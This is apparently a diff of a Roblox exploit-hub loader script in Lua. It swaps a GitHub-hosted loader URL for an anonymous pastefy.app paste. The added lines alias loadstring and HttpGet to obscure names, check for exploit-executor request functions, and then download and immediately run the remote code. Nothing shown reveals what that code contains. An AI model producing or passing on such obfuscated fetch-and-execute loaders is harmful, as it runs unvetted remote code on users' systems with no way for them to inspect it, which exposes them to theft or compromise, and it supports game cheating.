@@ -1,1 +1,6 @@
-loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
+local req = (syn and syn.request) or (http and http.request) or (http_request) or (request) or nil
+local g = game
+local lstr = loadstring
+local ggt = g.HttpGet
+local url = "https://pastefy.app/1pxVK68s/raw"
+lstr(ggt(g, url))()
